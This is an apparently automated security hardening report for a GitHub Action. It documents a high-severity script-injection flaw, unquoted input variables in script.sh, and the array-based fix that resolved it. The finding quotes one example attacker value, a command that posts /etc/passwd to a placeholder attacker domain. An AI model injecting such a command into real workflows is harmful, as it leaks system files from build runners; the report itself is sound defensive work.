<!-- markdownlint-disable -->

# Hardening Report: reviewdog--action-ast-grep/v1.58.6

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **reviewdog--action-ast-grep/v1.58.6** was hardened automatically. 1 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b) violation: Two env vars holding workflow-controllable inputs are expanded **unquoted** inside shell command pipelines in script.sh, allowing an attacker to inject arbitrary shell metacharacters (`;`, `|`, `&`, `$(...)`, backticks, etc.).

1. Line 49: `  ${INPUT_SG_FLAGS} |` — sourced from `inputs.sg_flags` (default `''`). An attacker-supplied value like `; curl -d @/etc/passwd https://evil.com` would be executed by the shell.
2. Line 57: `    ${INPUT_REVIEWDOG_FLAGS} |` — sourced from `inputs.reviewdog_flags` (default `''`). Same risk.

Neither uses the safe guarded form `${VAR:+"$VAR"}` nor double-quoting. The `# shellcheck disable=SC2086` comment on line 48 shows the warning was suppressed rather than fixed. Fix by quoting: use `"${INPUT_SG_FLAGS}"` / `"${INPUT_REVIEWDOG_FLAGS}"` if single-token, or use an array (`read -ra FLAGS <<< "$INPUT_SG_FLAGS"`) for multi-flag expansion.

Locations:

- `script.sh:49`
- `script.sh:57`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Fixed two unquoted multi-flag variable expansions in script.sh:
1. Replaced unquoted `${INPUT_SG_FLAGS}` (line 49) with a properly tokenized bash array `sg_flags` using xargs-based NUL-delimited tokenization.
2. Replaced unquoted `${INPUT_REVIEWDOG_FLAGS}` (line 57) with a properly tokenized bash array `reviewdog_flags` using the same pattern.
3. Removed the `# shellcheck disable=SC2086` comment that was suppressing the warning instead of fixing it.
Both arrays use guarded xargs tokenization (`if [ -n "$VAR" ]; then while IFS= read -r -d '' t; do array+=("$t"); done < <(printf '%s' "$VAR" | xargs printf '%s\0'); fi`) which is quote-aware and prevents shell metacharacter injection while correctly handling multi-flag inputs.

